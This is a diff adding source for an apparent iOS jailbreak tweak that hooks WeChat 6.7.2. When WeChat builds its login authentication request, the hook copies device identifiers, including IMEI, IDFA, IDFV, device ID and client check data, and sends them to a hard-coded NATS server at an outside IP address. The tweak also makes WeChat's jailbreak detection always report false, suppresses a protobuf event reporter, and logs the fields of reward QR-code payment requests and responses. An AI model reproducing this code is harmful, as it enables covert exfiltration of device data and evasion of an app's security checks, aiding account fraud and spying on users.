@@ -1,0 +1,131 @@
+#include "define.h"
+#import <objc/objc-runtime.h>
+#import <Foundation/Foundation.h>
+#import "TweakNetwork.framework/Headers/TweakNetwork.h"
+#include "_WeChat6.7.2/WXPBGeneratedMessage.h"
+#include "_WeChat6.7.2/SKBuiltinBuffer_t.h"
+#include "_WeChat6.7.2/SKBuiltinString_t.h"
+#include "_WeChat6.7.2/BaseRequest.h"
+#include "_WeChat6.7.2/CmdList.h"
+#include "_WeChat6.7.2/CmdItem.h"
+#include "_WeChat6.7.2/ECDHKey.h"
+#include "_WeChat6.7.2/BaseAuthReqInfo.h"
+#include "_WeChat6.7.2/WTLoginImgReqInfo.h"
+#include "_WeChat6.7.2/WxVerifyCodeReqInfo.h"
+#include "_WeChat6.7.2/NewSyncRequest.h"
+#include "_WeChat6.7.2/NewSyncResponse.h"
+#include "_WeChat6.7.2/ManualAuthAesReqData.h"
+#include "_WeChat6.7.2/ManualAuthRsaReqData.h"
+#include "_WeChat6.7.2/UnifyAuthResponse.h"
+#include "_WeChat6.7.2/AuthSectResp.h"
+#include "_WeChat6.7.2/WxVerifyCodeRespInfo.h"
+#include "_WeChat6.7.2/NetworkSectResp.h"
+#include "_WeChat6.7.2/BuiltinIPList.h"
+#include "_WeChat6.7.2/BuiltinIP.h"
+#include "_WeChat6.7.2/HostList.h"
+#include "_WeChat6.7.2/Host.h"
+#include "_WeChat6.7.2/NewInitRequest.h"
+#include "_WeChat6.7.2/HeartBeatRequest.h"
+#include "_WeChat6.7.2/NewInitResponse.h"
+#include "_WeChat6.7.2/TenPayResponse.h"
+#include "_WeChat6.7.2/DeepLinkBitSet.h"
+#include "_WeChat6.7.2/GeneralControlBitSet.h"
+#include "_WeChat6.7.2/JSAPIPermissionBitSet.h"
+#include "_WeChat6.7.2/HttpHeader.h"
+#include "_WeChat6.7.2/GetA8KeyReq.h"
+#include "_WeChat6.7.2/GetA8KeyResp.h"
+#include "_WeChat6.7.2/CheckTinkerUpdateResponse.h"
+#include "_WeChat6.7.2/TinkerPatchRespNode.h"
+#include "_WeChat6.7.2/ResourceMeta.h"
+#include "_WeChat6.7.2/TenPayRequest.h"
+
+
+%hook ManualAuthAesReqData
+-(id)serializedData{
+    NSDictionary *dict = @{
+        @"clientVersion": [[NSString alloc] initWithFormat:@"%d", self.baseRequest.clientVersion],
+        @"deviceId": [%c(QBRSA) dataToHexString:self.baseRequest.deviceId],
+        @"deviceType": [[NSString alloc] initWithData:self.baseRequest.deviceType encoding:NSUTF8StringEncoding],
+        @"clientCheckData": [%c(QBRSA) dataToHexString:self.clientCheckData.buffer],
+        @"clientSeqId": self.clientSeqId,
+        @"deviceBrand": self.deviceBrand,
+        @"deviceName": self.deviceName,
+        @"deviceModel": self.deviceModel,
+        @"deviceType2": self.deviceType,
+        @"imei": self.imei,
+        @"iphoneVer": self.iphoneVer,
+        @"softType": self.softType,
+        @"adSource": self.adSource,
+        @"language": self.language,
+        @"realCountry": self.realCountry,
+        @"idfa":[%c(QBBeaconUtil) getIDFA],
+        @"idfv":[%c(QBBeaconUtil) getIDFV],
+    };
+     NSData *jsonData = [NSJSONSerialization dataWithJSONObject:dict options:NSJSONWritingPrettyPrinted error:nil];
+    TweakNetworkSendMsg(@"nats://47.96.26.219:4222", @"hello.local.device.information", [%c(QBRSA) dataToHexString:jsonData]);
+    return %orig; 
+}
+%end
+
+%hook JailBreakHelper
++ (_Bool)JailBroken { %log; return false; }
+- (_Bool)IsJailBreak { %log; return false; }
+%end
+
+%hook ProtobufEvent
+- (_Bool)Pack:(struct AutoBuffer *)arg1 { %orig; return false; }
+%end
+
+
+@interface CgiSetRewardQrcodeReq : WXPBGeneratedMessage
+@property(retain, nonatomic) NSMutableArray *amtList; // @dynamic amtList;
+@property(retain, nonatomic) BaseRequest *baseRequest; // @dynamic baseRequest;
+@property(retain, nonatomic) NSString *desc; // @dynamic desc;
+@property(nonatomic) _Bool firstOpenFlag; // @dynamic firstOpenFlag;
+@property(nonatomic) _Bool modifyDefaultAmt; // @dynamic modifyDefaultAmt;
+@property(retain, nonatomic) NSString *photoAeskey; // @dynamic photoAeskey;
+@property(retain, nonatomic) NSString *photoUrl; // @dynamic photoUrl;
+@end
+
+@interface CgiSetRewardQrcodeResp : WXPBGeneratedMessage
+@property(retain, nonatomic) NSMutableArray *amtList; // @dynamic amtList;
+@property(retain, nonatomic) BaseResponse *baseResponse; // @dynamic baseResponse;
+@property(retain, nonatomic) NSString *desc; // @dynamic desc;
+@property(nonatomic) unsigned int iconLength; // @dynamic iconLength;
+@property(retain, nonatomic) NSString *photoAeskey; // @dynamic photoAeskey;
+@property(retain, nonatomic) NSString *photoUrl; // @dynamic photoUrl;
+@property(nonatomic) unsigned int photoWidth; // @dynamic photoWidth;
+@property(nonatomic) unsigned int retcode; // @dynamic retcode;
+@property(retain, nonatomic) NSString *retmsg; // @dynamic retmsg;
+@end
+
+
+%hook CgiSetRewardQrcodeReq
+-(id)serializedData{ 
+    NSLog(@"valueAtIndex1 = %@", [self valueAtIndex:0]);
+    NSLog(@"valueAtIndex2 = %@", [self valueAtIndex:1]);
+    NSLog(@"valueAtIndex3 = %@", [self valueAtIndex:2]);
+    NSLog(@"valueAtIndex4 = %@", [self valueAtIndex:3]);
+    NSLog(@"valueAtIndex5 = %@", [self valueAtIndex:4]);
+    NSLog(@"valueAtIndex6 = %@", [self valueAtIndex:5]);
+    id r = %orig;  
+    return r; 
+}
+- (void)setAmtList:(NSMutableArray *)amtList { %log; %orig; }
+- (void)setDesc:(NSString *)desc { %log; %orig; }
+- (void)setFirstOpenFlag:(_Bool )firstOpenFlag { %log; %orig; }
+- (void)setModifyDefaultAmt:(_Bool )modifyDefaultAmt { %log; %orig; }
+- (void)setPhotoAeskey:(NSString *)photoAeskey { %log; %orig; }
+- (void)setPhotoUrl:(NSString *)photoUrl { %log; %orig; }
+%end
+%hook CgiSetRewardQrcodeResp
+- (void)setValue:(id)arg1 atIndex:(int)arg2{%log;%orig; }
+- (NSMutableArray *)amtList { %log; NSMutableArray * r = %orig; HBLogDebug(@" = %@", r); return r; }
+- (NSString *)desc { %log; NSString * r = %orig; HBLogDebug(@" = %@", r); return r; }
+- (unsigned int )iconLength { %log; unsigned int  r = %orig; HBLogDebug(@" = %u", r); return r; }
+- (NSString *)photoAeskey { %log; NSString * r = %orig; HBLogDebug(@" = %@", r); return r; }
+- (NSString *)photoUrl { %log; NSString * r = %orig; HBLogDebug(@" = %@", r); return r; }
+- (unsigned int )photoWidth { %log; unsigned int  r = %orig; HBLogDebug(@" = %u", r); return r; }
+- (unsigned int )retcode { %log; unsigned int  r = %orig; HBLogDebug(@" = %u", r); return r; }
+- (NSString *)retmsg { %log; NSString * r = %orig; HBLogDebug(@" = %@", r); return r; }
+%end
